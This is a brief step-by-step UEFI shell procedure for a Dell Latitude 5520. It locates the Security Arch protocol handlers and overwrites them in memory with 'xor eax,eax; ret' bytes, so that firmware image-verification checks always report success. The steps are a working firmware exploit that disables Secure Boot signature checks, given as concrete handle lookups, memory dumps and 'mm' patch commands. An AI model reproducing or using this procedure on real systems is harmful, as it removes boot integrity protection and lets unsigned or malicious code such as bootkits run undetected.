Step 1:
	Find the handles for the SecurityArch GUIDS
	EFI_SECURITY2_ARCH_PROTOCOL_GUID 
		94AB2F58-1438-4EF1-9152-18941A3A0E68 (5F26F170)
	EFI_SECURITY_ARCH_PROTOCOL_GUID 
		A46423E3-4617-49F1-B9FF-D1BFA9115839 (5F26F168)
	Dell_Latitude_5520 (after running "dh -v"):
		Handle 5A (58F79A98)
		   A46423E3-4617-49F1-B9FF-D1BFA9115839 (5F26F168)
		   94AB2F58-1438-4EF1-9152-18941A3A0E68 (5F26F170)
Step 2:
	Find the protocol handler addresses, since they are so close we use the lower address:
		fs3:\> dmem 0x58F79A98 10
		  Memory Address 000000005F264828 10 Bytes
		  58F79A98: 10 C6 21 5F 00 00 00 00-50 C6 21 5F 00 00 00 00  *D. _...... _....*
  
Step 3:
	Patch the handlers using mm:
		fs3:\> mm 5F21C610 c3c03148 -w 4 -mem
		fs3:\> mm 5F21C650 c3c03148 -w 4 -mem
		
		
		
